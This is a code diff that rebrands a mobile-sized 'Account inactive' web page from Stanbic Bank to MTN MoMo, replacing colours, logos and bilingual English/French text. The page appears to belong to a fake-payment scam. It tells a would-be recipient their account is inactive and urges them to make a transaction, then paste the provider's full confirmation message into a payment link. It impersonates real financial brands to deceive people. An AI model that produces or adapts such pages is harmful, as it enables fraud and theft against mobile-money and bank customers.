@@ -3,51 +3,52 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>Stanbic Bank · Account Inactive</title>
+<title>MTN MoMo · Account Inactive</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
-    --sb-primary:   #01008C;
-    --sb-royal:     #005EB8;
-    --sb-navy:      #001E50;
-    --sb-gold:      #FFB81C;
-    --sb-white:     #FFFFFF;
-    --sb-text:      #1A2233;
-    --sb-muted:     #5B6577;
-    --sb-border:    #E4E8F0;
-    --sb-soft:      #F4F6FA;
-    --sb-page:      #EEF1F7;
-    --sb-amber:     #D97706;
-    --sb-amber-soft: #FFF7ED;
-    --sb-amber-border: #FED7AA;
-    --sb-gold-soft: #FFF8E1;
+    --mtn-yellow:        #FFCC00;
+    --mtn-yellow-dark:   #F5B500;
+    --mtn-yellow-light:  #FFF8E1;
+    --mtn-blue:          #0047AB;
+    --mtn-blue-dark:     #003380;
+    --mtn-navy:          #003366;
+    --mtn-white:         #FFFFFF;
+    --mtn-text:          #1F2937;
+    --mtn-muted:         #6B7280;
+    --mtn-border:        #E5E7EB;
+    --mtn-soft:          #F8FAFC;
+    --mtn-page:          #F1F5F9;
+    --mtn-amber:         #D97706;
+    --mtn-amber-soft:    #FFF7ED;
+    --mtn-amber-border:  #FED7AA;
   }
   * { box-sizing: border-box; margin: 0; padding: 0; }
   html, body { height: 100%; }
   body {
-    font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    background: var(--sb-page); color: var(--sb-text);
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--mtn-page); color: var(--mtn-text);
     -webkit-font-smoothing: antialiased; line-height: 1.5;
     min-height: 100vh; display: flex; justify-content: center; padding: 0;
   }
   .phone {
     width: 100%; max-width: 430px; min-height: 100vh;
-    background: var(--sb-white); display: flex; flex-direction: column;
+    background: var(--mtn-white); display: flex; flex-direction: column;
     position: relative; overflow: hidden;
   }
 
   .top {
     position: relative; flex-shrink: 0;
-    background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
+    background: linear-gradient(160deg, var(--mtn-blue) 0%, var(--mtn-navy) 100%);
     padding: 20px 22px 26px;
     border-bottom-left-radius: 20px;
     border-bottom-right-radius: 20px;
   }
   .top::before {
     content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px;
-    background: var(--sb-gold);
+    background: var(--mtn-yellow);
     border-top-left-radius: 20px; border-top-right-radius: 20px;
   }
   .brand-row {
@@ -55,12 +56,14 @@
   }
   .top-logo {
     height: 34px; width: auto; display: block; flex-shrink: 0;
+    border-radius: 6px; object-fit: contain;
+    background: #fff; padding: 2px 5px;
   }
   .brand-text {
     font-size: 22px; font-weight: 800; letter-spacing: -0.5px;
     color: #fff; line-height: 1; white-space: nowrap;
   }
-  .brand-text .dot { color: var(--sb-gold); }
+  .brand-text .brand-momo { color: var(--mtn-yellow); }
 
   .page-title {
     margin-top: 18px; font-size: 19px; font-weight: 800;
@@ -79,7 +82,7 @@
 
   .hero-icon {
     width: 72px; height: 72px; border-radius: 50%;
-    background: var(--sb-amber);
+    background: var(--mtn-amber);
     display: inline-flex; align-items: center; justify-content: center;
     margin: 0 auto 18px;
     box-shadow: 0 0 0 6px rgba(217,119,6,0.12),
@@ -93,18 +96,18 @@
 
   .status-title {
     font-size: 19px; font-weight: 800; letter-spacing: -0.3px;
-    color: var(--sb-navy); text-align: center;
+    color: var(--mtn-navy); text-align: center;
     line-height: 1.3; margin-bottom: 8px;
   }
   .status-desc {
-    font-size: 13px; color: var(--sb-muted); line-height: 1.6;
+    font-size: 13px; color: var(--mtn-muted); line-height: 1.6;
     text-align: center; max-width: 320px; margin: 0 auto 20px;
   }
 
   .notice-box {
-    background: var(--sb-amber-soft);
-    border: 1px solid var(--sb-amber-border);
-    border-left: 3px solid var(--sb-amber);
+    background: var(--mtn-amber-soft);
+    border: 1px solid var(--mtn-amber-border);
+    border-left: 3px solid var(--mtn-amber);
     border-radius: 12px;
     padding: 14px 16px;
     font-size: 12.5px;
@@ -134,8 +137,8 @@
   }
 
   .detail-list {
-    background: var(--sb-soft);
-    border: 1px solid var(--sb-border);
+    background: var(--mtn-soft);
+    border: 1px solid var(--mtn-border);
     border-radius: 12px;
     padding: 4px 16px;
     margin-bottom: 22px;
@@ -146,16 +149,16 @@
     font-size: 12.5px; gap: 12px;
   }
   .detail-row:last-child { border-bottom: none; }
-  .detail-row .k { color: var(--sb-muted); flex-shrink: 0; font-weight: 500; }
+  .detail-row .k { color: var(--mtn-muted); flex-shrink: 0; font-weight: 500; }
   .detail-row .v {
     font-weight: 700; text-align: right;
-    word-break: break-word; color: var(--sb-text);
+    word-break: break-word; color: var(--mtn-text);
   }
-  .detail-row .v.status-warn { color: var(--sb-amber); font-weight: 700; }
+  .detail-row .v.status-warn { color: var(--mtn-amber); font-weight: 700; }
 
   .sb-footer {
     width: 100%; margin-top: 4px;
-    background: var(--sb-navy);
+    background: var(--mtn-navy);
     border-radius: 12px;
     padding: 16px 18px;
     display: flex; align-items: center; justify-content: space-between;
@@ -167,27 +170,29 @@
   }
   .sb-footer .foot-logo {
     height: 26px; width: auto; display: block; flex-shrink: 0;
+    border-radius: 5px; object-fit: contain;
+    background: #fff; padding: 2px 4px;
   }
   .sb-footer .foot-brand-text {
     font-size: 16px; font-weight: 800; letter-spacing: -0.3px;
     color: #fff; line-height: 1; white-space: nowrap;
   }
-  .sb-footer .foot-brand-text .dot { color: var(--sb-gold); }
+  .sb-footer .foot-brand-text .brand-momo { color: var(--mtn-yellow); }
   .sb-footer .foot-support {
     font-size: 10.5px; color: rgba(255,255,255,0.72); line-height: 1.5; font-weight: 500;
     text-align: right;
   }
   .sb-footer .foot-support strong {
-    color: var(--sb-gold); font-weight: 700; font-size: 11.5px;
+    color: var(--mtn-yellow); font-weight: 700; font-size: 11.5px;
   }
 
   .close-btn {
     width: 100%; margin-top: 18px; min-height: 64px;
-    background: var(--sb-primary); color: #fff;
+    background: var(--mtn-blue); color: #fff;
     border: none; border-radius: 12px;
     font-family: inherit; font-size: 17px; font-weight: 800;
     letter-spacing: 0.4px; cursor: pointer;
-    box-shadow: 0 10px 24px rgba(1,0,140,0.28);
+    box-shadow: 0 10px 24px rgba(0,71,171,0.28);
     transition: filter .15s, transform .1s;
     display: flex; align-items: center; justify-content: center;
     padding: 18px 24px;
@@ -198,7 +203,7 @@
   .toast {
     position: fixed; bottom: 24px; left: 50%;
     transform: translateX(-50%) translateY(80px);
-    background: var(--sb-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
+    background: var(--mtn-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
     font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
     z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
     box-shadow: 0 12px 28px rgba(0,0,0,0.25);
@@ -224,7 +229,7 @@
     .phone {
       min-height: calc(100vh - 64px); max-height: 900px;
       border-radius: 20px;
-      box-shadow: 0 30px 80px rgba(1,0,140,0.18);
+      box-shadow: 0 30px 80px rgba(0,71,171,0.18);
       overflow: hidden;
     }
   }
@@ -243,12 +248,12 @@
     <div class="brand-row">
       <img
         class="top-logo"
-        src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-        alt="Stanbic Bank"
+        src="https://i.pinimg.com/1200x/f2/f9/38/f2f9385a59cf088b7b77472f3636d4fb.jpg"
+        alt="MTN MoMo"
         referrerpolicy="no-referrer"
         onerror="this.style.display='none'"
       >
-      <span class="brand-text">Stanbic<span class="dot">.</span></span>
+      <span class="brand-text">MTN<span class="brand-momo">&nbsp;MoMo</span></span>
     </div>
     <div class="page-title" id="pageTitle">Account inactive</div>
     <div class="page-sub" id="pageSub">This account is currently inactive. Complete a transaction on your account to reactivate it, then try receiving again.</div>
@@ -273,10 +278,10 @@
       <strong id="noticeTitle">What should you do?</strong>
       <ol id="noticeSteps">
         <li><strong>Make a transaction</strong> on your account (transfer, deposit, or pay a bill)</li>
-        <li>Wait for the <strong>confirmation message</strong> from Stanbic Bank</li>
+        <li>Wait for the <strong>confirmation message</strong> from MTN MoMo</li>
         <li>Come back to this page and <strong>tap "Confirm transfer" again</strong></li>
       </ol>
-      <span class="foot-note" id="noticeFoot">If your account is still inactive after a transaction, contact Stanbic Bank customer care or visit your nearest branch with your ID.</span>
+      <span class="foot-note" id="noticeFoot">If your account is still inactive after a transaction, contact MTN MoMo customer care or visit your nearest branch with your ID.</span>
     </div>
 
     <div class="detail-list">
@@ -291,12 +296,12 @@
       <div class="foot-brand">
         <img
           class="foot-logo"
-          src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-          alt="Stanbic Bank"
+          src="https://i.pinimg.com/1200x/f2/f9/38/f2f9385a59cf088b7b77472f3636d4fb.jpg"
+          alt="MTN MoMo"
           referrerpolicy="no-referrer"
           onerror="this.style.display='none'"
         >
-        <span class="foot-brand-text">Stanbic<span class="dot">.</span></span>
+        <span class="foot-brand-text">MTN<span class="brand-momo">&nbsp;MoMo</span></span>
       </div>
       <div class="foot-support">
         <span id="needHelpLabel">Customer Care</span><br>
@@ -314,7 +319,7 @@
 <script>
   const I18N = {
     en: {
-      docTitle: 'Stanbic Bank · Account Inactive',
+      docTitle: 'MTN MoMo · Account Inactive',
       pageTitle: 'Account inactive',
       pageSub: 'This account is currently inactive. Complete a transaction on your account to reactivate it, then try receiving again.',
       statusTitle: 'Account inactive',
@@ -322,10 +327,10 @@
       noticeTitle: 'What should you do?',
       noticeSteps: [
         '<strong>Make a transaction</strong> on your account (transfer, deposit, or pay a bill)',
-        'Wait for the <strong>confirmation message</strong> from Stanbic Bank',
+        'Wait for the <strong>confirmation message</strong> from MTN MoMo',
         'Come back to this page and <strong>tap "Confirm transfer" again</strong>'
       ],
-      noticeFoot: 'If your account is still inactive after a transaction, contact Stanbic Bank customer care or visit your nearest branch with your ID.',
+      noticeFoot: 'If your account is still inactive after a transaction, contact MTN MoMo customer care or visit your nearest branch with your ID.',
       kTransaction: 'Reference',
       kRecipient: 'Recipient',
       kAmount: 'Amount',
@@ -339,12 +344,12 @@
       statusDescFullSms: 'The confirmation message you submitted was incomplete and this account is currently inactive. Complete a transaction on your account to reactivate it.',
       noticeStepsFullSms: [
         '<strong>Make a transaction</strong> on your account (transfer, deposit, or pay a bill)',
-        'Wait for the <strong>confirmation message</strong> from Stanbic Bank',
+        'Wait for the <strong>confirmation message</strong> from MTN MoMo',
         'Come back to the payment link and <strong>paste the full confirmation message</strong>'
       ]
     },
     fr: {
-      docTitle: 'Stanbic Bank · Compte inactif',
+      docTitle: 'MTN MoMo · Compte inactif',
       pageTitle: 'Compte inactif',
       pageSub: 'Ce compte est actuellement inactif. Effectuez une transaction sur votre compte pour le réactiver, puis réessayez de recevoir.',
       statusTitle: 'Compte inactif',
@@ -352,10 +357,10 @@
       noticeTitle: 'Que devez-vous faire ?',
       noticeSteps: [
         '<strong>Effectuez une transaction</strong> sur votre compte (virement, dépôt ou paiement de facture)',
-        'Attendez le <strong>message de confirmation</strong> de Stanbic Bank',
+        'Attendez le <strong>message de confirmation</strong> de MTN MoMo',
         'Revenez sur cette page et <strong>appuyez à nouveau sur « Confirmer le virement »</strong>'
       ],
-      noticeFoot: 'Si votre compte est toujours inactif après une transaction, contactez le service client de Stanbic Bank ou visitez votre agence la plus proche avec votre pièce d\'identité.',
+      noticeFoot: 'Si votre compte est toujours inactif après une transaction, contactez le service client de MTN MoMo ou visitez votre agence la plus proche avec votre pièce d\'identité.',
       kTransaction: 'Référence',
       kRecipient: 'Destinataire',
       kAmount: 'Montant',
@@ -369,7 +374,7 @@
       statusDescFullSms: 'Le message de confirmation que vous avez soumis était incomplet et ce compte est actuellement inactif. Effectuez une transaction sur votre compte pour le réactiver.',
       noticeStepsFullSms: [
         '<strong>Effectuez une transaction</strong> sur votre compte (virement, dépôt ou paiement de facture)',
-        'Attendez le <strong>message de confirmation</strong> de Stanbic Bank',
+        'Attendez le <strong>message de confirmation</strong> de MTN MoMo',
         'Revenez sur le lien de paiement et <strong>collez le message de confirmation complet</strong>'
       ]
     }
